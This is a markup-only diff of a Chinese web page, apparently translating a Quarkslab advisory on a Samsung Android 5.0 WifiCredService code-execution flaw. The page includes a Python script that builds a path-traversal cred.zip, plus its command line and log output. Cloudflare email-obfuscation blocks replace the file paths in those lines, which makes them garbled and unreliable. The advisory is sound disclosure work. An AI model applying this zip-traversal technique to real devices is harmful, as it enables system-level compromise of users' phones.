@@ -3,22 +3,22 @@
 			<head>
 			     <title>三星安卓5.0设备WifiCredService 远程代码执行 - netwind</title>
 				 <meta http-equiv="content-type" content="text/html; charset=UTF-8">
-			</head>
+			<link rel="stylesheet" type="text/css" href="../stylesheets/stylesheet.css" media="screen"><link rel="stylesheet" type="text/css" href="../stylesheets/github-dark.css" media="screen"><link rel="stylesheet" type="text/css" href="../stylesheets/print.css" media="print"><style type="text/css">body {width: 90%;max-width: 960px;display: block;margin: 0 auto;}img {max-width: 900px;}</style></head>
 			<body>
 				<h1>原文地址:<a href="http://drops.wooyun.org/papers/10642">http://drops.wooyun.org/papers/10642</a></h1>
 				
       <p>
-        <p>From:http://blog.quarkslab.com/remote-code-execution-as-system-user-on-android-5-samsung-devices-abusing-wificredservice-hotspot-20.html</p>
+        </p><p>From:http://blog.quarkslab.com/remote-code-execution-as-system-user-on-android-5-samsung-devices-abusing-wificredservice-hotspot-20.html</p>
 
 <h1>0x00摘要</h1>
 
-<hr />
+<hr>
 
 <p>该漏洞在几个月前被Google Project Zero和Quarkslab团队发现，最近才被披露出来。该漏洞只需用户浏览一个网站或下载一个邮件附件或通过基本没有任何权限的第三方恶意程序就可以触发，据目前掌握的情况，该漏洞在所有三星安卓5.0设备上都可以以系统用户身份进行远程代码执行。</p>
 
 <h1>0x01 漏洞概述</h1>
 
-<hr />
+<hr>
 
 <p>在三星安卓5.0设备上，有一个系统进程通过使用基于inotify机制的一个JAVA 对象FileObserver，来对设备目录/sdcard/Download/进行文件监控。当一个文件以cred开头并且以.zip为后缀的压缩包文件在上述目录被创建时，系统会调用一个解压例程在/data/bundle/目录解压这个文件，并在解压完毕后把压缩包文件从/sdcard/Download/目录里删除。</p>
 
@@ -30,7 +30,7 @@
 
 <h1>0x02 攻击场景</h1>
 
-<hr />
+<hr>
 
 <p>根据我们的研究，以下场景可以利用该漏洞进行攻击：</p>
 
@@ -42,17 +42,17 @@
 
 <h1>0x03 如何检测该漏洞？</h1>
 
-<hr />
+<hr>
 
 <p>为了快速、方便检测该漏洞，我们在google开源工程Android VTS (<a href="https://play.google.com/store/apps/details?id=com.nowsecure.android.vts">https://play.google.com/store/apps/details?id=com.nowsecure.android.vts</a>).上提供了一个模块。这样安装了Android VTS就可以检测设备是否存在漏洞。</p>
 
 <p>漏洞检测效果如图：</p>
 
-<p><img src="http://static.wooyun.org//drops/20151124/2015112408074278405p11.jpg" alt="" /></p>
+<p><img src="http://static.wooyun.org//drops/20151124/2015112408074278405p11.jpg" alt=""></p>
 
 <h1>0x04 细节分析</h1>
 
-<hr />
+<hr>
 
 <p>以下分析在三星Galaxy S6上进行，存在漏洞代码的应用为Hs20Settings.apk，它注册了一个名为WifiHs20BroadcastReceiver的BroadcastReceiver（广播接收服务），该服务在应用启动的时候就会被执行，或者在某些WIFI事件（例如android.net.wifi.STATE_CHANGE）产生的时也会被执行。</p>
 
@@ -283,7 +283,7 @@ label_45:
 
 <h1>0x05 漏洞攻击</h1>
 
-<hr />
+<hr>
 
 <p>首先我们构造一个任意文件名的zip文件，用 python脚本很容易实现：</p>
 
@@ -314,8 +314,8 @@ with ZipFile("cred.zip", "w") as z:
 
 <p>这里比较完美的一个选择如下：</p>
 
-<pre><code><a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="89fae1ece5e5c9e2e5fdec">[email&#160;protected]</a><script data-cfhash='f9e31' type="text/javascript">/* <![CDATA[ */!function(t,e,r,n,c,a,p){try{t=document.currentScript||function(){for(t=document.getElementsByTagName('script'),e=t.length;e--;)if(t[e].getAttribute('data-cfhash'))return t[e]}();if(t&&(c=t.previousSibling)){p=t.parentNode;if(a=c.getAttribute('data-cfemail')){for(e='',r='0x'+a.substr(0,2)|0,n=2;a.length-n;n+=2)e+='%'+('0'+('0x'+a.substr(n,2)^r).toString(16)).slice(-2);p.replaceChild(document.createTextNode(decodeURIComponent(e)),c)}p.removeChild(t)}}catch(u){}}()/* ]]> */</script>:/ $ ls -al <a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="f8d79c998c99d79c99948e9193d59b999b909dd7998a95d78b818b8c9d95b8998888">[email&#160;protected]</a><script data-cfhash='f9e31' type="text/javascript">/* <![CDATA[ */!function(t,e,r,n,c,a,p){try{t=document.currentScript||function(){for(t=document.getElementsByTagName('script'),e=t.length;e--;)if(t[e].getAttribute('data-cfhash'))return t[e]}();if(t&&(c=t.previousSibling)){p=t.parentNode;if(a=c.getAttribute('data-cfemail')){for(e='',r='0x'+a.substr(0,2)|0,n=2;a.length-n;n+=2)e+='%'+('0'+('0x'+a.substr(n,2)^r).toString(16)).slice(-2);p.replaceChild(document.createTextNode(decodeURIComponent(e)),c)}p.removeChild(t)}}catch(u){}}()/* ]]> */</script>@<a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="69280a0a0c1a1a2a06071d1b060529280a0a0c1a1a2a06071d1b060547081902">[email&#160;protected]</a><script data-cfhash='f9e31' type="text/javascript">/* <![CDATA[ */!function(t,e,r,n,c,a,p){try{t=document.currentScript||function(){for(t=document.getElementsByTagName('script'),e=t.length;e--;)if(t[e].getAttribute('data-cfhash'))return t[e]}();if(t&&(c=t.previousSibling)){p=t.parentNode;if(a=c.getAttribute('data-cfemail')){for(e='',r='0x'+a.substr(0,2)|0,n=2;a.length-n;n+=2)e+='%'+('0'+('0x'+a.substr(n,2)^r).toString(16)).slice(-2);p.replaceChild(document.createTextNode(decodeURIComponent(e)),c)}p.removeChild(t)}}catch(u){}}()/* ]]> */</script>@classes.dex
--rw-r--r-- system   u0_a31000   176560 2015-10-30 15:40 <a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="99eae0eaedfcf4d9f8e9e9">[email&#160;protected]</a><script data-cfhash='f9e31' type="text/javascript">/* <![CDATA[ */!function(t,e,r,n,c,a,p){try{t=document.currentScript||function(){for(t=document.getElementsByTagName('script'),e=t.length;e--;)if(t[e].getAttribute('data-cfhash'))return t[e]}();if(t&&(c=t.previousSibling)){p=t.parentNode;if(a=c.getAttribute('data-cfemail')){for(e='',r='0x'+a.substr(0,2)|0,n=2;a.length-n;n+=2)e+='%'+('0'+('0x'+a.substr(n,2)^r).toString(16)).slice(-2);p.replaceChild(document.createTextNode(decodeURIComponent(e)),c)}p.removeChild(t)}}catch(u){}}()/* ]]> */</script>@<a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="dd9cbebeb8aeae9eb2b3a9afb2b19d9cbebeb8aeae9eb2b3a9afb2b1f3bcadb6">[email&#160;protected]</a><script data-cfhash='f9e31' type="text/javascript">/* <![CDATA[ */!function(t,e,r,n,c,a,p){try{t=document.currentScript||function(){for(t=document.getElementsByTagName('script'),e=t.length;e--;)if(t[e].getAttribute('data-cfhash'))return t[e]}();if(t&&(c=t.previousSibling)){p=t.parentNode;if(a=c.getAttribute('data-cfemail')){for(e='',r='0x'+a.substr(0,2)|0,n=2;a.length-n;n+=2)e+='%'+('0'+('0x'+a.substr(n,2)^r).toString(16)).slice(-2);p.replaceChild(document.createTextNode(decodeURIComponent(e)),c)}p.removeChild(t)}}catch(u){}}()/* ]]> */</script>@classes.dex
+<pre><code><a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="89fae1ece5e5c9e2e5fdec">[email&#160;protected]</a><script data-cfhash="f9e31" type="text/javascript">/* <![CDATA[ */!function(t,e,r,n,c,a,p){try{t=document.currentScript||function(){for(t=document.getElementsByTagName('script'),e=t.length;e--;)if(t[e].getAttribute('data-cfhash'))return t[e]}();if(t&&(c=t.previousSibling)){p=t.parentNode;if(a=c.getAttribute('data-cfemail')){for(e='',r='0x'+a.substr(0,2)|0,n=2;a.length-n;n+=2)e+='%'+('0'+('0x'+a.substr(n,2)^r).toString(16)).slice(-2);p.replaceChild(document.createTextNode(decodeURIComponent(e)),c)}p.removeChild(t)}}catch(u){}}()/* ]]> */</script>:/ $ ls -al <a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="f8d79c998c99d79c99948e9193d59b999b909dd7998a95d78b818b8c9d95b8998888">[email&#160;protected]</a><script data-cfhash="f9e31" type="text/javascript">/* <![CDATA[ */!function(t,e,r,n,c,a,p){try{t=document.currentScript||function(){for(t=document.getElementsByTagName('script'),e=t.length;e--;)if(t[e].getAttribute('data-cfhash'))return t[e]}();if(t&&(c=t.previousSibling)){p=t.parentNode;if(a=c.getAttribute('data-cfemail')){for(e='',r='0x'+a.substr(0,2)|0,n=2;a.length-n;n+=2)e+='%'+('0'+('0x'+a.substr(n,2)^r).toString(16)).slice(-2);p.replaceChild(document.createTextNode(decodeURIComponent(e)),c)}p.removeChild(t)}}catch(u){}}()/* ]]> */</script>@<a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="69280a0a0c1a1a2a06071d1b060529280a0a0c1a1a2a06071d1b060547081902">[email&#160;protected]</a><script data-cfhash="f9e31" type="text/javascript">/* <![CDATA[ */!function(t,e,r,n,c,a,p){try{t=document.currentScript||function(){for(t=document.getElementsByTagName('script'),e=t.length;e--;)if(t[e].getAttribute('data-cfhash'))return t[e]}();if(t&&(c=t.previousSibling)){p=t.parentNode;if(a=c.getAttribute('data-cfemail')){for(e='',r='0x'+a.substr(0,2)|0,n=2;a.length-n;n+=2)e+='%'+('0'+('0x'+a.substr(n,2)^r).toString(16)).slice(-2);p.replaceChild(document.createTextNode(decodeURIComponent(e)),c)}p.removeChild(t)}}catch(u){}}()/* ]]> */</script>@classes.dex
+-rw-r--r-- system   u0_a31000   176560 2015-10-30 15:40 <a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="99eae0eaedfcf4d9f8e9e9">[email&#160;protected]</a><script data-cfhash="f9e31" type="text/javascript">/* <![CDATA[ */!function(t,e,r,n,c,a,p){try{t=document.currentScript||function(){for(t=document.getElementsByTagName('script'),e=t.length;e--;)if(t[e].getAttribute('data-cfhash'))return t[e]}();if(t&&(c=t.previousSibling)){p=t.parentNode;if(a=c.getAttribute('data-cfemail')){for(e='',r='0x'+a.substr(0,2)|0,n=2;a.length-n;n+=2)e+='%'+('0'+('0x'+a.substr(n,2)^r).toString(16)).slice(-2);p.replaceChild(document.createTextNode(decodeURIComponent(e)),c)}p.removeChild(t)}}catch(u){}}()/* ]]> */</script>@<a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="dd9cbebeb8aeae9eb2b3a9afb2b19d9cbebeb8aeae9eb2b3a9afb2b1f3bcadb6">[email&#160;protected]</a><script data-cfhash="f9e31" type="text/javascript">/* <![CDATA[ */!function(t,e,r,n,c,a,p){try{t=document.currentScript||function(){for(t=document.getElementsByTagName('script'),e=t.length;e--;)if(t[e].getAttribute('data-cfhash'))return t[e]}();if(t&&(c=t.previousSibling)){p=t.parentNode;if(a=c.getAttribute('data-cfemail')){for(e='',r='0x'+a.substr(0,2)|0,n=2;a.length-n;n+=2)e+='%'+('0'+('0x'+a.substr(n,2)^r).toString(16)).slice(-2);p.replaceChild(document.createTextNode(decodeURIComponent(e)),c)}p.removeChild(t)}}catch(u){}}()/* ]]> */</script>@classes.dex
 </code></pre>
 
 <p>观察这个应用的manifest文件，发现它有自动运行的能力，它通过注册一个 BroadcastReceiver服务，监听android.intent.action.BOOT_COMPLETED事件来自动运行：</p>
@@ -418,11 +418,11 @@ from zipfile import ZipFile
 
 with ZipFile("cred.zip","w") as z:
   z.writestr(sys.argv[1],open(sys.argv[2],"rb").read())
-&gt; python injectzip.py ../../../../../..<a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="08276c697c69276c69647e6163256b696b606d27697a65277b717b7c6d6548697878">[email&#160;protected]</a><script data-cfhash='f9e31' type="text/javascript">/* <![CDATA[ */!function(t,e,r,n,c,a,p){try{t=document.currentScript||function(){for(t=document.getElementsByTagName('script'),e=t.length;e--;)if(t[e].getAttribute('data-cfhash'))return t[e]}();if(t&&(c=t.previousSibling)){p=t.parentNode;if(a=c.getAttribute('data-cfemail')){for(e='',r='0x'+a.substr(0,2)|0,n=2;a.length-n;n+=2)e+='%'+('0'+('0x'+a.substr(n,2)^r).toString(16)).slice(-2);p.replaceChild(document.createTextNode(decodeURIComponent(e)),c)}p.removeChild(t)}}catch(u){}}()/* ]]> */</script>@<a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="1c5d7f7f796f6f5f7372686e73705c5d7f7f796f6f5f7372686e7370327d6c77">[email&#160;protected]</a><script data-cfhash='f9e31' type="text/javascript">/* <![CDATA[ */!function(t,e,r,n,c,a,p){try{t=document.currentScript||function(){for(t=document.getElementsByTagName('script'),e=t.length;e--;)if(t[e].getAttribute('data-cfhash'))return t[e]}();if(t&&(c=t.previousSibling)){p=t.parentNode;if(a=c.getAttribute('data-cfemail')){for(e='',r='0x'+a.substr(0,2)|0,n=2;a.length-n;n+=2)e+='%'+('0'+('0x'+a.substr(n,2)^r).toString(16)).slice(-2);p.replaceChild(document.createTextNode(decodeURIComponent(e)),c)}p.removeChild(t)}}catch(u){}}()/* ]]> */</script>@classes.dex /tmp/art/modified.oat
+&gt; python injectzip.py ../../../../../..<a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="08276c697c69276c69647e6163256b696b606d27697a65277b717b7c6d6548697878">[email&#160;protected]</a><script data-cfhash="f9e31" type="text/javascript">/* <![CDATA[ */!function(t,e,r,n,c,a,p){try{t=document.currentScript||function(){for(t=document.getElementsByTagName('script'),e=t.length;e--;)if(t[e].getAttribute('data-cfhash'))return t[e]}();if(t&&(c=t.previousSibling)){p=t.parentNode;if(a=c.getAttribute('data-cfemail')){for(e='',r='0x'+a.substr(0,2)|0,n=2;a.length-n;n+=2)e+='%'+('0'+('0x'+a.substr(n,2)^r).toString(16)).slice(-2);p.replaceChild(document.createTextNode(decodeURIComponent(e)),c)}p.removeChild(t)}}catch(u){}}()/* ]]> */</script>@<a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="1c5d7f7f796f6f5f7372686e73705c5d7f7f796f6f5f7372686e7370327d6c77">[email&#160;protected]</a><script data-cfhash="f9e31" type="text/javascript">/* <![CDATA[ */!function(t,e,r,n,c,a,p){try{t=document.currentScript||function(){for(t=document.getElementsByTagName('script'),e=t.length;e--;)if(t[e].getAttribute('data-cfhash'))return t[e]}();if(t&&(c=t.previousSibling)){p=t.parentNode;if(a=c.getAttribute('data-cfemail')){for(e='',r='0x'+a.substr(0,2)|0,n=2;a.length-n;n+=2)e+='%'+('0'+('0x'+a.substr(n,2)^r).toString(16)).slice(-2);p.replaceChild(document.createTextNode(decodeURIComponent(e)),c)}p.removeChild(t)}}catch(u){}}()/* ]]> */</script>@classes.dex /tmp/art/modified.oat
 &gt; zipinfo cred.zip
 Archive:  cred.zip
 Zip file size: 172750 bytes, number of entries: 1
-?rw-------  2.0 unx   172464 b- stor 15-Nov-08 18:43 ../../../../../..<a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="c3eca7a2b7a2eca7a2afb5aaa8eea0a2a0aba6eca2b1aeecb0bab0b7a6ae83a2b3b3">[email&#160;protected]</a><script data-cfhash='f9e31' type="text/javascript">/* <![CDATA[ */!function(t,e,r,n,c,a,p){try{t=document.currentScript||function(){for(t=document.getElementsByTagName('script'),e=t.length;e--;)if(t[e].getAttribute('data-cfhash'))return t[e]}();if(t&&(c=t.previousSibling)){p=t.parentNode;if(a=c.getAttribute('data-cfemail')){for(e='',r='0x'+a.substr(0,2)|0,n=2;a.length-n;n+=2)e+='%'+('0'+('0x'+a.substr(n,2)^r).toString(16)).slice(-2);p.replaceChild(document.createTextNode(decodeURIComponent(e)),c)}p.removeChild(t)}}catch(u){}}()/* ]]> */</script>@<a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="9ddcfefef8eeeedef2f3e9eff2f1dddcfefef8eeeedef2f3e9eff2f1b3fcedf6">[email&#160;protected]</a><script data-cfhash='f9e31' type="text/javascript">/* <![CDATA[ */!function(t,e,r,n,c,a,p){try{t=document.currentScript||function(){for(t=document.getElementsByTagName('script'),e=t.length;e--;)if(t[e].getAttribute('data-cfhash'))return t[e]}();if(t&&(c=t.previousSibling)){p=t.parentNode;if(a=c.getAttribute('data-cfemail')){for(e='',r='0x'+a.substr(0,2)|0,n=2;a.length-n;n+=2)e+='%'+('0'+('0x'+a.substr(n,2)^r).toString(16)).slice(-2);p.replaceChild(document.createTextNode(decodeURIComponent(e)),c)}p.removeChild(t)}}catch(u){}}()/* ]]> */</script>@classes.dex
+?rw-------  2.0 unx   172464 b- stor 15-Nov-08 18:43 ../../../../../..<a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="c3eca7a2b7a2eca7a2afb5aaa8eea0a2a0aba6eca2b1aeecb0bab0b7a6ae83a2b3b3">[email&#160;protected]</a><script data-cfhash="f9e31" type="text/javascript">/* <![CDATA[ */!function(t,e,r,n,c,a,p){try{t=document.currentScript||function(){for(t=document.getElementsByTagName('script'),e=t.length;e--;)if(t[e].getAttribute('data-cfhash'))return t[e]}();if(t&&(c=t.previousSibling)){p=t.parentNode;if(a=c.getAttribute('data-cfemail')){for(e='',r='0x'+a.substr(0,2)|0,n=2;a.length-n;n+=2)e+='%'+('0'+('0x'+a.substr(n,2)^r).toString(16)).slice(-2);p.replaceChild(document.createTextNode(decodeURIComponent(e)),c)}p.removeChild(t)}}catch(u){}}()/* ]]> */</script>@<a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="9ddcfefef8eeeedef2f3e9eff2f1dddcfefef8eeeedef2f3e9eff2f1b3fcedf6">[email&#160;protected]</a><script data-cfhash="f9e31" type="text/javascript">/* <![CDATA[ */!function(t,e,r,n,c,a,p){try{t=document.currentScript||function(){for(t=document.getElementsByTagName('script'),e=t.length;e--;)if(t[e].getAttribute('data-cfhash'))return t[e]}();if(t&&(c=t.previousSibling)){p=t.parentNode;if(a=c.getAttribute('data-cfemail')){for(e='',r='0x'+a.substr(0,2)|0,n=2;a.length-n;n+=2)e+='%'+('0'+('0x'+a.substr(n,2)^r).toString(16)).slice(-2);p.replaceChild(document.createTextNode(decodeURIComponent(e)),c)}p.removeChild(t)}}catch(u){}}()/* ]]> */</script>@classes.dex
 1 file, 172464 bytes uncompressed, 172464 bytes compressed:  0.0%
 </code></pre>
 
@@ -442,7 +442,7 @@ Zip file size: 172750 bytes, number of entries: 1
 --------- beginning of main
 --------- beginning of system
 I/WifiCredService( 4599): File CLOSE_WRITE [/storage/emulated/0/Download/cred.zip]8
-V/WifiCredService( 4599): Unzipping********** ../../../../../..<a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="8ca3e8edf8eda3e8ede0fae5e7a1efedefe4e9a3edfee1a3fff5fff8e9e1ccedfcfc">[email&#160;protected]</a><script data-cfhash='f9e31' type="text/javascript">/* <![CDATA[ */!function(t,e,r,n,c,a,p){try{t=document.currentScript||function(){for(t=document.getElementsByTagName('script'),e=t.length;e--;)if(t[e].getAttribute('data-cfhash'))return t[e]}();if(t&&(c=t.previousSibling)){p=t.parentNode;if(a=c.getAttribute('data-cfemail')){for(e='',r='0x'+a.substr(0,2)|0,n=2;a.length-n;n+=2)e+='%'+('0'+('0x'+a.substr(n,2)^r).toString(16)).slice(-2);p.replaceChild(document.createTextNode(decodeURIComponent(e)),c)}p.removeChild(t)}}catch(u){}}()/* ]]> */</script>@<a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="a2e3c1c1c7d1d1e1cdccd6d0cdcee2e3c1c1c7d1d1e1cdccd6d0cdce8cc3d2c9">[email&#160;protected]</a><script data-cfhash='f9e31' type="text/javascript">/* <![CDATA[ */!function(t,e,r,n,c,a,p){try{t=document.currentScript||function(){for(t=document.getElementsByTagName('script'),e=t.length;e--;)if(t[e].getAttribute('data-cfhash'))return t[e]}();if(t&&(c=t.previousSibling)){p=t.parentNode;if(a=c.getAttribute('data-cfemail')){for(e='',r='0x'+a.substr(0,2)|0,n=2;a.length-n;n+=2)e+='%'+('0'+('0x'+a.substr(n,2)^r).toString(16)).slice(-2);p.replaceChild(document.createTextNode(decodeURIComponent(e)),c)}p.removeChild(t)}}catch(u){}}()/* ]]> */</script>@classes.dex
+V/WifiCredService( 4599): Unzipping********** ../../../../../..<a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="8ca3e8edf8eda3e8ede0fae5e7a1efedefe4e9a3edfee1a3fff5fff8e9e1ccedfcfc">[email&#160;protected]</a><script data-cfhash="f9e31" type="text/javascript">/* <![CDATA[ */!function(t,e,r,n,c,a,p){try{t=document.currentScript||function(){for(t=document.getElementsByTagName('script'),e=t.length;e--;)if(t[e].getAttribute('data-cfhash'))return t[e]}();if(t&&(c=t.previousSibling)){p=t.parentNode;if(a=c.getAttribute('data-cfemail')){for(e='',r='0x'+a.substr(0,2)|0,n=2;a.length-n;n+=2)e+='%'+('0'+('0x'+a.substr(n,2)^r).toString(16)).slice(-2);p.replaceChild(document.createTextNode(decodeURIComponent(e)),c)}p.removeChild(t)}}catch(u){}}()/* ]]> */</script>@<a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="a2e3c1c1c7d1d1e1cdccd6d0cdcee2e3c1c1c7d1d1e1cdccd6d0cdce8cc3d2c9">[email&#160;protected]</a><script data-cfhash="f9e31" type="text/javascript">/* <![CDATA[ */!function(t,e,r,n,c,a,p){try{t=document.currentScript||function(){for(t=document.getElementsByTagName('script'),e=t.length;e--;)if(t[e].getAttribute('data-cfhash'))return t[e]}();if(t&&(c=t.previousSibling)){p=t.parentNode;if(a=c.getAttribute('data-cfemail')){for(e='',r='0x'+a.substr(0,2)|0,n=2;a.length-n;n+=2)e+='%'+('0'+('0x'+a.substr(n,2)^r).toString(16)).slice(-2);p.replaceChild(document.createTextNode(decodeURIComponent(e)),c)}p.removeChild(t)}}catch(u){}}()/* ]]> */</script>@classes.dex
 V/WifiCredService( 4599): Extdex
 V/WifiCredService( 4599): Mime Typenull
 </code></pre>
@@ -460,7 +460,7 @@ F/sh4ka   ( 3613): boom!
 
 <h1>0x06 总结</h1>
 
-<hr />
+<hr>
 
 <p>如文中所见，OEM定制仍然是安卓安全中最薄弱的环节。当你的智能手机给你一个机会，可以通过一个逻辑漏洞来获得一个100%稳定的exploit，你会愿意绕过沙箱或者击败系统保护机制(ASLR/canary/...) 来获得这个稳定的exploit吗？</p>
 
@@ -468,7 +468,7 @@ F/sh4ka   ( 3613): boom!
 
 <h1>0x07 引用</h1>
 
-<hr />
+<hr>
 
 <ul>
 <li>(0)<a href="https://code.google.com/p/google-security-research/issues/detail?id=489">https://code.google.com/p/google-security-research/issues/detail?id=489</a></li>
@@ -481,7 +481,7 @@ F/sh4ka   ( 3613): boom!
 <li>(7)<a href="https://android-review.googlesource.com/#/c/127710/">https://android-review.googlesource.com/#/c/127710/</a></li>
 <li>(8)<a href="https://github.com/jakev/oat2dex-python/">https://github.com/jakev/oat2dex-python/</a></li>
 <li>(9)<a href="https://www.blackhat.com/docs/asia-15/materials/asia-15-Sabanal-Hiding-Behind-ART.pdf">https://www.blackhat.com/docs/asia-15/materials/asia-15-Sabanal-Hiding-Behind-ART.pdf</a></li>
-</ul>      </p>
+</ul>      <p></p>
     
 			</body>
 		</html>
